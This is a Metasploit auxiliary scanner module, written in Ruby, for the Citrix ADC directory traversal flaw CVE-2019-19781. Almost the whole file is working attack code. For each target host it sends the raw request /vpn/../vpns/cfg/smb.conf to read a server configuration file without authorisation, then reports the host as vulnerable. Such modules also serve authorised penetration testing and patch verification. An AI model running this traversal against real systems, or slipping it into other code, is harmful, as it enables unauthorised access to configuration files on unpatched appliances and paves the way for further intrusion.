##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanServer
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Citrix ADC Directory Traversal',
      'Description' => 'This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC (NetScalers). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presense of a "global" variable in smb.conf, which this file should always contain.',
      'Author'         =>
        [
          'Erik Wynter',
          'altonjx',
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate'   =>  "Dec 17 2019",
      'References'     =>
        [
          ['CVE', '2019-19781'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2019-19781/'],
          ['URL', 'https://support.citrix.com/article/CTX267027/']
        ]

    )

  end

  def run_host(target_host)

    turl = normalize_uri('/vpn/../vpns/cfg/smb.conf')

    begin

      res = send_request_raw({
        'uri'     => turl,
        'method'  => 'GET',
        'version' => '1.0',
      }, 10)


      if not res
        print_error("#{target_host}#{turl} - No response, target seems down.")
        return
      end

      rscode = res.code

      if rscode != 200
        print_status("HTTP response code: #{rscode}. The target is not vulnerable to CVE-2019-19781.")
        vprint_status("Did not find #{target_host}#{turl}, hence the target is not vulnerable to CVE-2019-19781.")
        return
      end

      print_status("Found #{target_host}#{turl}.")
      print_good("The target is vulnerable to CVE-2019-19781.")

      vprint_status("Obtained HTTP response code #{rscode} for #{target_host}#{turl}. This means that access to /vpns/cfg/smb.conf was obtained via directory traversal, hence #{target_host} is vulnerable to CVE-2019-19781.")
      report_note(
        :host	=> target_host,
        :port	=> rport,
        :proto => 'tcp',
        :sname	=> (ssl ? 'https' : 'http'),
        :type	=> 'CVE_2019_19781_check',
      )

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
